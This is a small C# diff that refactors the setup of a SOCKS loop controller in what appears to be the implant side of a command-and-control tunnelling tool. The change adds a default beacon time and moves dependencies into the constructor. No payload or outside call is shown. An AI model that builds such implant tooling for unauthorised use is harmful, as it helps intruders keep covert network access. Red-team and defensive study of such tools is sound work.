@@ -46,12 +46,11 @@ namespace ImplantSide.Classes.Socks
             {
                 _error = new InternalErrorHandler(_config.ImplantComms);
                 _cmdCommsHandler = new CommandCommunicationHandler(Encryptor, _config, _error) { ImplantComms = ImplantComms };
-                _sockLoopctrller = new SocksLoopController()
+				Int16 beaconTime = (_config.BeaconTime > 0) ? _config.BeaconTime : (short)400;
+				_sockLoopctrller = new SocksLoopController(ImplantComms, _cmdCommsHandler, beaconTime)
                 {
                     Encryption = Encryptor,
-                    ErrorHandler = _error,
-                    CmdCommshandler = _cmdCommsHandler,
-                    ImplantComms = ImplantComms
+                    ErrorHandler = _error
                 };
                 _cmdChannel = new CommandChannelController(_config.CommandChannel, _sockLoopctrller, _cmdCommsHandler, _error) { ImplantComms = ImplantComms };
             }
